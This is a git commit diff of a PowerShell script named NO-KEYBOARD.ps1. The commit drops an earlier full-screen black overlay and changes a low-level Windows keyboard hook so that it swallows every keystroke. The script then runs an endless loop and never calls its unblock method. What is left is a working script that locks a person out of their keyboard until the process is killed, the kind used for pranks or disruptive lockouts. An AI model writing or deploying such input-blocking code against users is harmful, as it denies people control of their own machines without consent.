da1c26916cb9fd96615d1fbc6539d9f107ab57da
Amau_Zero <amautomato.lev@gmail.com>
2025-11-16 15:11:11 +0100

    Refactor keyboard hook to block all keys

--- NO-KEYBOARD.ps1
+++ NO-KEYBOARD.ps1
@@ -1,21 +1,8 @@
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-$form = New-Object System.Windows.Forms.Form
-$form.Size = New-Object System.Drawing.Size(1920, 1080)
-$form.StartPosition = "Manual"
-$form.Location = New-Object System.Drawing.Point(0, 0)
-$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
-$form.TopMost = $true
-$form.BackColor = [System.Drawing.Color]::Black
-$form.Show()
-$form.Focus()
-
-# Définition du hook clavier
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 
-public class KeyboardHook {
+public class KeyboardBlocker {
     private static IntPtr hookId = IntPtr.Zero;
     private static HookProc hookProc;
     public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
@@ -33,30 +20,24 @@ public class KeyboardHook {
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-    public static void Start() {
-        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
-        using (var curModule = curProcess.MainModule) {
-            hookProc = HookCallback;
-            hookId = SetWindowsHookEx(13, hookProc, GetModuleHandle(curModule.ModuleName), 0);
-        }
+    public static void Block() {
+        hookProc = HookCallback;
+        hookId = SetWindowsHookEx(13, hookProc, GetModuleHandle(null), 0);
     }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && (wParam == (IntPtr)0x100 || wParam == (IntPtr)0x101)) {
-            return (IntPtr)1; // Bloque la touche
-        }
+        if (nCode >= 0) return (IntPtr)1; // Bloque toutes les touches
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
 
-    public static void Stop() {
+    public static void Unblock() {
         UnhookWindowsHookEx(hookId);
     }
 }
 "@
 
-[KeyboardHook]::Start()
+[KeyboardBlocker]::Block()
 
-# Boucle infinie pour garder le script actif
 while ($true) {
     Start-Sleep -Seconds 10
 }
